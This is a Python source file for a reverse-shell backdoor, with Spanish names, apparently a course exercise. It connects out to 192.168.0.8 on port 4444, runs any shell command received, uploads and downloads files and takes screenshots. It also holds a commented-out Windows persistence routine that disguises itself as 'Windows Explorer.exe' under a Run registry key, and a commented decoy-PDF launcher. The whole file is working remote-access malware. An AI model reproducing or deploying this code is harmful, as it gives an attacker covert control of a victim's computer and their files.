import socket
import subprocess
import os
import base64
import json
import shutil
import sys
import pyautogui

class Backdoor:
  def __init__(self, ip, port):
    #self.become_persistent()
    self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connection.connect((ip, port))
  
  def become_persistent(self):
    evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe" 
    if not os.path.exists(evil_file_location):
      shutil.copyfile(sys.executable, evil_file_location)
      subprocess.call(f"""ref add HKCU\Sofware\Microsoft\Windows\CurrentVersion\Run  /v update /t REG_SZ /d "{evil_file_location}"  """, shell=True)
  def reliable_send(self, data):
    json_data = json.dumps(data).encode()
    self.connection.send(json_data)
  def reliable_receive(self):
    json_data = ""
    while True:
      try:
          json_data = json_data + self.connection.recv(1024).decode()
          return json.loads(json_data)
      except ValueError:
          continue
  def ejecutar_comando_del_sistema(self, comando):
    DEVNULL = open(os.devnull, "wb")
    return subprocess.check_output(
      comando, 
      shell = True, 
      stderr = DEVNULL, 
      stdin = DEVNULL 
    )
  def cambiar_directorio(self, path):
    os.chdir(path)
    return f"[+] Cambiando directorio a {path}"
  def leer_archivo(self,path):
    with open(path, "rb") as file:
      return base64.b64encode(file.read())
  def escribir_archivo(self, path, content):
    with open(path, "wb") as file:
      file.write(base64.b64decode(content))
      return "[+] Subida exitosa."
  def run(self):
    while True:
      comando = self.reliable_receive()
      try:
        if comando == "exit":
          self.connection.close()
          break
        elif comando[0] == "screenshot":
          print("Taking screenshot")
          screenshot = pyautogui.screenshot()
          screenshot.save("screenshot.png")
          resultados_comando = "[+] Screenshot saved"
        elif comando[0] == "cd" and len(comando)>1:
          resultados_comando = self.cambiar_directorio(comando[1])
        elif comando[0] == "descargar":
          resultados_comando = self.leer_archivo(comando[1]).decode()
        elif comando[0] == "subir":
          resultados_comando = self.escribir_archivo(comando[1], comando[2])
        else:
          resultados_comando = self.ejecutar_comando_del_sistema(comando).decode('ISO-8859-1')
      except Exception as e:
        print(e)
        resultados_comando = "[-] Error durante la ejecucion del comando."
      self.reliable_send(resultados_comando)
    exit()

#file_name = sys._MEIPASS + "\\Practica_Final.pdf"
#subprocess.Popen(file_name, shell=True)

try:
  puerta = Backdoor("192.168.0.8", 4444)
  puerta.run()
except Exception:
  sys.exit()

  
